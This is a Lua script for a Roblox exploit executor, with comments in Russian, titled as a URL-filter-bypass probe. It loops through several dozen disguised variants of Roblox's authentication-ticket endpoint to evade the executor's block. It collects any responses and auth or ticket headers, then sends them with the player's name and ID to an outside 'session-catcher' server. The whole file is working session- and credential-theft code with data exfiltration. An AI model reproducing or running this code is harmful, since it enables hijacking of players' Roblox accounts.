-- ============================================================
--  Probe A — URL Filter Bypass
--  Обход блокировки auth.roblox.com через модификацию URL
-- ============================================================

local SERVER_URL = "https://session-catcher.onrender.com/catch"
local httpRequest = request or http_request or nil
if not httpRequest then return end

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local urlBypassResults = {}

-- Все варианты URL для auth ticket
local authUrls = {
    -- Регистр
    "https://Auth.Roblox.com/v1/authentication-ticket",
    "https://AUTH.ROBLOX.COM/v1/authentication-ticket",
    "https://auth.Roblox.com/v1/authentication-ticket",
    -- Порт
    "https://auth.roblox.com:443/v1/authentication-ticket",
    "https://auth.roblox.com:80/v1/authentication-ticket",
    -- Trailing
    "https://auth.roblox.com/v1/authentication-ticket?",
    "https://auth.roblox.com/v1/authentication-ticket#",
    "https://auth.roblox.com/v1/authentication-ticket/",
    -- Path traversal
    "https://auth.roblox.com/./v1/authentication-ticket",
    "https://auth.roblox.com/v1/./authentication-ticket",
    "https://auth.roblox.com//v1/authentication-ticket",
    "https://auth.roblox.com/v1//authentication-ticket",
    -- URL encoding
    "https://auth%2Eroblox%2Ecom/v1/authentication-ticket",
    "https://auth.roblox%2Ecom/v1/authentication-ticket",
    "https://auth%2eroblox%2ecom/v1/authentication-ticket",
    -- Double encoding
    "https://auth%252Eroblox%252Ecom/v1/authentication-ticket",
    -- Subdomain tricks
    "https://www.auth.roblox.com/v1/authentication-ticket",
    "https://auth-www.roblox.com/v1/authentication-ticket",
    -- IP (auth.roblox.com резолвится в разные IP, но попробуем)
    "https://auth.roblox.com./v1/authentication-ticket",
    -- Auth endpoints на www (не заблокирован)
    "https://www.roblox.com/api/authentication-ticket",
    "https://www.roblox.com/authentication/ticket",
    "https://www.roblox.com/auth/ticket",
    "https://www.roblox.com/api/auth/ticket",
    "https://www.roblox.com/login/get-session-token",
    "https://www.roblox.com/api/users/authenticated",
    -- Другие поддомены
    "https://api.roblox.com/auth/ticket",
    "https://api.roblox.com/v1/authentication-ticket",
}

for _, url in ipairs(authUrls) do
    pcall(function()
        local ok, resp = pcall(function()
            return game:HttpGet(url)
        end)
        if ok and resp then
            urlBypassResults[url] = "OK: " .. tostring(resp):sub(1, 400)
        else
            urlBypassResults[url] = "ERR: " .. tostring(resp):sub(1, 200)
        end
    end)
    task.wait(0.2)
end

-- Также пробуем request() к этим URL (может Delta прикрепит куку к roblox.com)
for _, url in ipairs(authUrls) do
    pcall(function()
        local ok, resp = pcall(httpRequest, {
            Url = url,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = ""
        })
        if ok and resp then
            local result = "Status:" .. tostring(resp.StatusCode) .. " Body:" .. tostring(resp.Body):sub(1, 300)
            if resp.Headers then
                for k, v in pairs(resp.Headers) do
                    if tostring(k):lower():find("ticket") or tostring(k):lower():find("auth") then
                        result = result .. " HEADER:" .. tostring(k) .. "=" .. tostring(v):sub(1, 200)
                    end
                end
            end
            urlBypassResults["request:" .. url] = result
        else
            urlBypassResults["request:" .. url] = "ERR: " .. tostring(resp):sub(1, 200)
        end
    end)
    task.wait(0.2)
end

local payload = {
    probe = "A — URL Filter Bypass",
    username = LocalPlayer.Name,
    userId = LocalPlayer.UserId,
    urlBypassResults = urlBypassResults,
    timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
}

pcall(function()
    httpRequest({
        Url = SERVER_URL,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(payload)
    })
end)

print("[Probe A] sent. URLs tested: " .. #authUrls)
